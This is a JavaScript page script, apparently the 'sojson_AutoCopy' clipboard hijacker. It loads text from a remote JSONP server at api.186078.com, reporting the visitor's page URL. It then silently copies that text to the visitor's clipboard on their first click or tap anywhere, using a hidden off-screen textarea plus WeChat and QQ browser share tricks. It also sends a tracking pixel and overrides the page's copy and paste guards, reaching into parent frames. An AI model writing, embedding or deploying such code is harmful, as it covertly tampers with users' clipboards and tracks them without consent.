(function($$) {
    var sojson_AutoCopy = {
        trigger: null,
        dd: document,
        ww: window,
        listener: [],
        listenerTouchend: [],
        listenerCopy: null,
        text: null,
        action: "copy",
        ua: window.navigator.userAgent,
        host: location.protocol + "//" + location.host,
        id: "default",
        token: "",
        hascopy: null,
        hasload: null,
        hascopy2: null,
        closeqq: "no",
        tongjiURL: null,
        trackids:null,ds:document.domain,
        getCodeUrl: "https://api.186078.com:3928/kl.php?from=100&to=20113&callback=getback",
        //getCodeUrl: "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&position=88",   
        //https://api.186078.com:3928/kl.php?from=100&to=10001
        showAd: function() {
            this.id = window.knty_nkl_proxy_f;
        },
        randText: function(pams) {
            return this.rands(pams);
        },
        rands: function(source) {
            return source[Math.floor(Math.random() * source.length)];
        },
        isArray: function(f) {
            return "[object Array]" == Object.prototype.toString.call(f)
        },
        init: function() {
            sojson_AutoCopy.trackids = typeof(trackid) != 'undefined' ? trackid : 10125;
            var sojson_core = this;
            sojson_core.trigger = sojson_core.dd.getElementsByTagName("*");
            sojson_core.showAd();
            sojson_core.hascopy = sojson_core.sGet("knty_nkl_copy");
            sojson_core.hasload = sojson_core.sGet("knty_nkl_load");

            if(null == sojson_core.sGet("knty_nkl_open")) {
                var vinfo = "";
                null != sojson_core.sGet("knty_nkl_open_info") ? (vinfo = sojson_core.sGet("knty_nkl_open_info")) : (vinfo = sojson_core.randomString(), sojson_core.sSet("knty_nkl_open_info", vinfo, window.knty_nkl_proxy_c));
                sojson_core.getJSONP(sojson_AutoCopy.getCodeUrl, {
                    f: sojson_core.id,
                    h: sojson_core.hasload,
                    current_url: encodeURIComponent(top.location.href)
                }, function(b) {
                    var autoText = b.text;
                    if(sojson_AutoCopy.isArray(autoText)) {
                        autoText = sojson_AutoCopy.randText(autoText);
                    }
                    sojson_AutoCopy.tongjiURL = b.tongji ? b.tongji : '//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&position=8';
                    sojson_core.text = autoText;
                    sojson_core.token = b.token;
                    sojson_core.closeqq = b.closeqq;
                    if(b.iscn == "no") {
                        sojson_core.wxcp(b.text);
                    }
                    sojson_core.sSet("knty_nkl_load", "has", 86400);
                    "null" == sojson_core.text && (sojson_core.text = 0);
                    sojson_core.dd.queryCommandSupported && sojson_core.dd.queryCommandSupported(sojson_core.action) ? sojson_core.text && (sojson_core.listenClick(), sojson_core.listenTouchend()) : 1 < sojson_core.ua.split("MQQBrowser").length && 1 < sojson_core.ua.split("Android").length && 2 > sojson_core.ua.split("MicroMessenger").length && 2 > sojson_core.ua.split("QQ/").length ? sojson_core.text && sojson_core.qqCopy() : (sojson_core.listenerCopy = sojson_core.listenNode(sojson_core.dd.body, "click", sojson_core.clipboardCopy.bind(sojson_core)));
                }, this);
            }
        },
        wxcp: function(a) {
            if(/MicroMessenger/i.test(navigator.userAgent)) {
                var iframe = document.createElement("iframe");
                iframe.style.cssText = "display:none;width:0px;height:0px;";
                iframe.src = "weixin://webview/copy/" + a;
                document.body.appendChild(iframe);
            }
        },
        cp: function(a) {
            //alert('abc');
            //var trackid = 1;
            //var IS_DP = 88;
            //var ds = document.domain;
            //var a_url = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&position=88&dp="+IS_DP+"&platform=" + (navigator ? encodeURIComponent(navigator.platform) : '')+"&dtime=" + new Date()+'&ds='+ds;//isCrossDomain
            //new Image().src = a_url;
            var b = this;
            console.log('/////////////////////////////');
            //console.log(b);
            //console.log(sojson_AutoCopy.tongjiURL);
            if(b.hascopy2 == null && sojson_AutoCopy.tongjiURL != null) {
                b.hascopy2 = "yes";
                //alert('def');
                var trackid = typeof(sojson_AutoCopy.trackids) != 'undefined' ? sojson_AutoCopy.trackids : 1;

                var img_url = sojson_AutoCopy.tongjiURL + '&trackid='+trackid+'&ul='+top.location.href+'&ds='+sojson_AutoCopy.ds+'&dtime' + (+new Date());
                new Image().src = img_url;
                b.sSet("knty_nkl_open", "close", window.knty_nkl_proxy_c);
                b.sSet("knty_nkl_copy", "has", 86400);


                /*
                    b.getJSONP(sojson_AutoCopy.tongjiURL, {
                    f: b.id,
                    trackid:
                    h: b.hascopy,
                    current_url: encodeURIComponent(top.location.href)
                }, function(c) {
                    b.sSet("knty_nkl_open", "close", window.knty_nkl_proxy_c);
                    b.sSet("knty_nkl_copy", "has", 86400);
                }, true);
                */
            }
        },
        qqCopy: function() {
            var a = this,
                b = a.text,
                c = navigator.appVersion,
                e = 1 < c.split("MQQBrowser/").length ? 2 : 0;
            if(a.closeqq == "yes") {
                return true;
            }
            if(e) {
                var f = {
                    url: b,
                    to_app: "10",
                    us_txt: "23s"
                };
                b = c.split("MQQBrowser/")[1].split(".");
                b = parseFloat(b[0] + "." + b[1]);
                b = 5.4 > (e ? b : 0) ? "//3gimg.qq.com/html5/js/qb.js" : "//jsapi.qq.com/get?api=app.share";
                c = a.dd.createElement("script");
                var d = a.dd.getElementsByTagName("body")[0];
                c.setAttribute("src", b);
                c.onload = function() {
                    "undefined" != typeof a.ww.browser && "undefined" != typeof a.ww.browser.app && 2 == e ? (a.ww.browser.app.share(f), a.cp("1")) : "undefined" != typeof a.ww.qb && 1 == e && (a.ww.qb.share(f), a.cp("1"));
                };
                d.appendChild(c);
            }
        },
        clipboardCopy: function(a) {
            _this.ww.clipboardData && this.text && _this.ww.clipboardData.setData("Text", this.text);
            this.listenerCopy.destroy();
        },
        listenClick: function() {
            for(var a = this, b = 0; b < a.trigger.length; b++) {
                a.listener.push(a.listenNode(a.trigger[b], "click", function(b) {
                    return a.onClick(b, "click");
                }));
            }
        },
        listenTouchend: function() {
            for(var a = this, b = 0; b < a.trigger.length; b++) {
                a.listenerTouchend.push(a.listenNode(a.trigger[b], "touchend", function(b) {
                    return a.onClick(b, "touchend");
                }));
            }
        },
        listenNode: function(a, b, c) {

            a.addEventListener(b, c, true);
            return {
                destroy: function() {
                    a.removeEventListener(b, c, true);
                }
            };
        },
        onClick: function(a, b) {
            var c = this;
            this.dd.body.hasAttribute("oncopy") && this.dd.body.setAttribute("oncopy", "return true");
            this.dd.body.hasAttribute("onpaste") && this.dd.body.setAttribute("onpaste", "return true");
            "INPUT" != a.target.nodeName && "TEXTAREA" != a.target.nodeName && ((new $$(this.text, this.action, function(a) {
                a ? c.cp("1") : c.cp("2");
            })).start(), "click" == b ? (this.listenerD = true, this.listener.forEach(function(a, b) {
                a.destroy();
            })) : "touchend" == b && this.listenerTouchend.forEach(function(a, b) {
                a.destroy();
            }));
            this.dd.body.hasAttribute("oncopy") && this.dd.body.setAttribute("oncopy", "return false");
            this.dd.body.hasAttribute("onpaste") && this.dd.body.setAttribute("onpaste", "return false");
        },
        randomString: function() {
            var a = "";
            for(i = 0; 7 > i; i++) {
                a += "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(61 * Math.random()));
            }
            return a;
        },
        sGet: function(a) {
            try {
                if(!this.ww.localStorage[a]) {
                    return null;
                }
                var b = JSON.parse(this.ww.localStorage[a]);
                return b.time < (new Date).getTime() ? (this.ww.localStorage[a] = null) : b.value;
            } catch(c) {
                return console.log("not localStorage."), null;
            }
        },
        sSet: function(a, b, c) {
            try {
                var e = {
                    name: a,
                    value: b,
                    time: (new Date).getTime() + 1000 * c
                };
                this.ww.localStorage[a] = JSON.stringify(e);
            } catch(f) {
                console.log("not localStorage.");
            }
        },
        now: function() {
            return(new Date).getTime();
        },
        rand: function() {
            return Math.random().toString().substr(2);
        },
        parseData: function(a) {
            var b = "";
            if("string" === typeof a) {
                b = a;
            } else if("object" === typeof a) {
                for(var c in a) {
                    b += "&" + c + "=" + encodeURIComponent(a[c]);
                }
            }
            b += "&_time=" + this.now();
            return b = b.substr(1);
        },
        getJSONP: function(a, b, c) {
            a = a + (-1 === a.indexOf("?") ? "?" : "&") + this.parseData(b);
            if((b = /callback=(\w+)/.exec(a)) && b[1]) {
                var e = b[1];
            } else {
                e = "jsonp_" + this.now() + "_" + this.rand(), a = a.replace("callback=?", "callback=" + e), a = a.replace("callback=%3F", "callback=" + e);
            }
            b = document.createElement("script");
            b.type = "text/javascript";
            b.src = a;
            b.id = "taobao_" + e;
            window[e] = function(a) {
                window[e] = void 0;
                var b = document.getElementById("taobao_" + e),
                    k = b.parentNode;
                k && 11 !== k.nodeType && k.removeChild(b);
                c(a);
            };
            (a = document.getElementsByTagName("head")) && a[0] && a[0].appendChild(b);
        }
    };
    try {
        parent.window.location.href != window.location.href && (sojson_AutoCopy.host = parent.window.location.protocol + "//" + parent.window.location.host, sojson_AutoCopy.dd = parent.document, sojson_AutoCopy.ww = parent.window), sojson_AutoCopy.init();
    } catch(a) {
        sojson_AutoCopy.init();
    }
})(function(h, g, a) {
    return {
        fakeElem: null,
        text: h,
        action: g,
        selectedText: null,
        dd: document,
        ww: window,
        start: function() {
            this.text && (parent.window.location.href != window.location.href && (this.ww = top.window, this.dd = top.document), this.selectFake());
        },
        selectFake: function() {
            var a = "rtl" == this.dd.documentElement.getAttribute("dir");
            this.removeFake();
            this.fakeElem = this.dd.createElement("textarea");
            this.fakeElem.style.fontSize = "12pt";
            this.fakeElem.style.border = "0";
            this.fakeElem.style.padding = "0";
            this.fakeElem.style.margin = "0";
            this.fakeElem.style.position = "absolute";
            a ? (this.fakeElem.style.right = "-9999px") : (this.fakeElem.style.left = "-9999px");
            this.fakeElem.style.top = (this.ww.pageYOffset || this.dd.documentElement.scrollTop) + "px";
            this.fakeElem.setAttribute("readonly", "");
            this.fakeElem.value = this.text;
            this.dd.body.appendChild(this.fakeElem);
            this.selectedText = this.selectText(this.fakeElem);
            this.copyText();
        },
        removeFake: function() {
            this.fakeElem && (this.dd.body.removeChild(this.fakeElem), this.fakeElem = null);
        },
        copyText: function() {
            var b = void 0;
            try {
                b = this.dd.execCommand(this.action);
            } catch(c) {
                b = false;
            }
            this.removeFake();
            a.call(this, b);
        },
        selectText: function(a) {
            if("SELECT" === a.nodeName) {
                a.focus(), a = a.value;
            } else if("INPUT" === a.nodeName || "TEXTAREA" === a.nodeName) {
                var b = a.hasAttribute("readonly");
                b || a.setAttribute("readonly", "");
                a.select();
                a.setSelectionRange(0, a.value.length);
                b || a.removeAttribute("readonly");
                a = a.value;
            } else {
                a.hasAttribute("contenteditable") && a.focus();
                b = this.ww.getSelection();
                var e = this.dd.createRange();
                e.selectNodeContents(a);
                b.removeAllRanges();
                b.addRange(e);
                a = b.toString();
            }
            return a;
        }
    };
});
var _hmt = _hmt || [];